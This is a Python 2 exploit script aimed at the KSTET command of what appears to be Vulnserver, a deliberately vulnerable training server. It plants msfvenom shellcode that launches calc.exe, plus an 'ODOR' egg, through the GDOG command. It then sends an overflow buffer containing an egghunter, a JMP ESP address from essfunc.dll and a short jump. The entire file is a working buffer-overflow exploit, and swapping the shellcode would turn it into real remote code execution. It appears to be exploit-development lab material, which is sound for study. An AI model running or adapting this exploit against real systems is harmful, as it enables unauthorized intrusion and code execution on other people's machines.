#!/usr/bin/env python
import sys, socket, struct, time
 
if len(sys.argv) <= 2:
    print "Usage: python " + sys.argv[0] + " [host] [port]"
    exit()

host = sys.argv[1]    
port = int(sys.argv[2])

# msfvenom -p windows/exec cmd=calc.exe -v shellcode -f python -b '\x00\x0a\x0d'
# Size 220 bytes
shellcode =  ""
shellcode += "\xbb\x0e\xfc\x2c\xe1\xda\xc7\xd9\x74\x24\xf4\x58"
shellcode += "\x2b\xc9\xb1\x31\x83\xe8\xfc\x31\x58\x0f\x03\x58"
shellcode += "\x01\x1e\xd9\x1d\xf5\x5c\x22\xde\x05\x01\xaa\x3b"
shellcode += "\x34\x01\xc8\x48\x66\xb1\x9a\x1d\x8a\x3a\xce\xb5"
shellcode += "\x19\x4e\xc7\xba\xaa\xe5\x31\xf4\x2b\x55\x01\x97"
shellcode += "\xaf\xa4\x56\x77\x8e\x66\xab\x76\xd7\x9b\x46\x2a"
shellcode += "\x80\xd0\xf5\xdb\xa5\xad\xc5\x50\xf5\x20\x4e\x84"
shellcode += "\x4d\x42\x7f\x1b\xc6\x1d\x5f\x9d\x0b\x16\xd6\x85"
shellcode += "\x48\x13\xa0\x3e\xba\xef\x33\x97\xf3\x10\x9f\xd6"
shellcode += "\x3c\xe3\xe1\x1f\xfa\x1c\x94\x69\xf9\xa1\xaf\xad"
shellcode += "\x80\x7d\x25\x36\x22\xf5\x9d\x92\xd3\xda\x78\x50"
shellcode += "\xdf\x97\x0f\x3e\xc3\x26\xc3\x34\xff\xa3\xe2\x9a"
shellcode += "\x76\xf7\xc0\x3e\xd3\xa3\x69\x66\xb9\x02\x95\x78"
shellcode += "\x62\xfa\x33\xf2\x8e\xef\x49\x59\xc4\xee\xdc\xe7"
shellcode += "\xaa\xf1\xde\xe7\x9a\x99\xef\x6c\x75\xdd\xef\xa6"
shellcode += "\x32\x11\xba\xeb\x12\xba\x63\x7e\x27\xa7\x93\x54"
shellcode += "\x6b\xde\x17\x5d\x13\x25\x07\x14\x16\x61\x8f\xc4"
shellcode += "\x6a\xfa\x7a\xeb\xd9\xfb\xae\x88\xbc\x6f\x32\x61"
shellcode += "\x5b\x08\xd1\x7d"

maxlen = 500
crash_eip = 70

# Egghunter "ODOR"
egghunt = "\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x02\x58\xCD\x2E\x3C\x05\x5A\x74\xEF\xB8\x52\x4F\x44\x4F\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7"

# Eggstring
egg = "ODOR"[::-1] * 2

# JMP ESP
jump = struct.pack("<L", 0x625011AF)    # JMP ESP # essfunc.dll

# Just add some junk
fill = "A" * 12

# Prefill with junk and egghunter
prefix = fill
prefix += egghunt
prefix += "A" * (crash_eip - len(fill + egghunt))
eip = jump
align_esp = "\xEB\xB6"                  # jmp short 0xffffffb8
suffix = "C" * (maxlen - len(prefix + eip + align_esp))

payload = prefix + eip + align_esp + suffix

print "[+] Connecting to " + host + "\n"

try:
        
        print "[+] Fuzzing with " + str(len(payload)) + " length message..."
        
        req = (
                "KSTET " +
                payload +
                "\r\n"
        )
    
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)

        s.connect((host, port))
        # Connect to GDOG functionality for storing egg and shellcode in memory
        s.send("GDOG " + egg + shellcode)
        s.recv(1024)
        s.send(req)
        s.close()

        time.sleep(0.5)
    
except Exception,e:
        print "[!] Error occured: " + str(e)
        print "[*] Crashed occured at buffer length: " + str(len(payload))
        sys.exit()


